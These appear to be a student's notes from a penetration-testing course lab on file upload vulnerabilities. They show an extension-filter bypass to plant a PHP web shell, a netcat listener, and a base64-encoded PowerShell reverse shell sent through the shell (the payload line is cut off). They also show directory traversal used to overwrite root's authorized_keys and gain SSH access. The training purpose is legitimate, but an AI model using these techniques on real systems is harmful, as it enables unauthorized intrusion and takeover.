### Using Executable Files

Locating upload mechanisms...

If  a web app is CMS, we can upload an avatar to our profile, create blog posts, or web pages with attached files. 

Using this web app

![Figure 14: Updated](https://static.offsec.com/offsec-courses/PEN-200/imgs/commonwebattacks/37d2c066c3cafc48221c5ea1bd6c7994-cwa_fu_exform6.png)

Notice:
* Upload form for photos
* XAMPP icon (app is probably running XAMPP stack)

Let's try to upload a text file instead of a photo. 

Create test file:

```
kali@kali:~$ echo "this is a test" > test.txt
```

Upload to site

![Figure 15: Successful Upload of test.txt](https://static.offsec.com/offsec-courses/PEN-200/imgs/commonwebattacks/cb17ff179a44406765a7941273af4b38-cwa_fu_exupload3.png)

This worked. 

Try to upload `simple-backdoor.php` now.

![Figure 16: Failed Upload of simple-backdoor.php](https://static.offsec.com/offsec-courses/PEN-200/imgs/commonwebattacks/4a72622e1b3880ad2492c06614d40f4a-cwa_fu_exphpuloadfail2.png)

Not allowed. 

Let's try to bypass this filter.

Filter bypass methods:
* Change file extension from `.php` to `.phps`or `.php7`
* Modify characters in file extension from `.php` to `.pHP`

Looks like modifying the file extension characters worked

![Figure 17: Successful Upload of simple-backdoor.pHP](https://static.offsec.com/offsec-courses/PEN-200/imgs/commonwebattacks/3c35cddf396565e48313a5605838c0c4-cwa_fu_expHP2.png)

Using #curl to verify the file uploaded to uploads directory.

```hlt:1,7
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
...

```

Let's get a reverse shell.

Start netcat listener.

```hlt:1
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

Using PowerShell one-liner for reverse shell. Encode the string with base64.

NTS: Install PowerShell on Linux.

Use curl to execute the encoded one-liner via the `simple-backdoor.pHP`

Add base64 encoded string using `-enc` parameter with `%20` to URL encode the space. 

```hlt:1
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0

### Using Non-Executable Files

When uploading files to a web app always try the upload twice to see how app responds. 

If app says file already exists, we could bruteforce the contents of web server. 

If app displays an error, we may get info such as programming language or web technologies in use. 

Ex: Uploaded a test.txt file to web app and caught the upload request with Burp. 

POST request for the file upload of test.txt in Burp

![Figure 20: POST request for the file upload of test.txt in Burp](https://static.offsec.com/offsec-courses/PEN-200/imgs/commonwebattacks/0f3ac15c454bc8a783e1979ded24f48c-cwa_fu_burptxtcom.png)

Determine if we have directory traversal vulnerability with test.txt 

Relative path in filename to upload file outside of web root
![Figure 21: Relative path in filename to upload file outside of web root](https://static.offsec.com/offsec-courses/PEN-200/imgs/commonwebattacks/09717aa19bfbb0fe03b6cab91643e9a7-cwa_fu_burprelcom.png)

Assuming the relative path was used for placing the file (and that the `../` weren't sanitized), we could attempt to blindly overwrite files to gain system access. (NOT GOOD FOR REAL-WORLD ENGAGEMENTS)

***** Brief Notes on Web Server Accounts and Permissions *****

Dedicated web servers often have dedicated users. 

Linux apps:
`Apache`and `Nginx` would have `www-data`user 

Windows apps:
`IIS`would have `Network Service` account

`IIS version 7.5` included the 

_IIS Application Pool Identities_- virtual accounts running web apps grouped by _application pools_. 

Always try to leverage root or admin privileges in file upload vulnerability.

Try to overwrite `authorized_keys` file in root's home directory. 

Creating SSH key-pair with ssh-keygen 

Prepare authorized_keys file for File Upload

```
kali@kali:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in fileup
Your public key has been saved in fileup.pub
...

kali@kali:~$ cat fileup.pub > authorized_keys
```
Exploit File Upload to write authorized_keys file in root home directory

![Figure 22: Exploit File Upload to write authorized_keys file in root home directory](https://static.offsec.com/offsec-courses/PEN-200/imgs/commonwebattacks/999ddab4c6543dc3d727618bc14ed495-cwa_fu_burprelsshcom.png)

If we overwrote the `authorized_keys` file of root user, we can connect with our private key over ssh. 

Using the SSH key to successufully connect via SSH as the root user

```hlt:1
kali@kali:~$ ssh -p 2222 -i fileup root@mountaindesserts.com
The authenticity of host '[mountaindesserts.com]:2222 ([192.168.50.16]:2222)' can't be established.
ED25519 key fingerprint is SHA256:R2JQNI3WJqpEehY2Iv9QdlMAoeB3jnPvjJqqfDZ3IXU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
root@76b77a6eae51:~#
```

This worked.
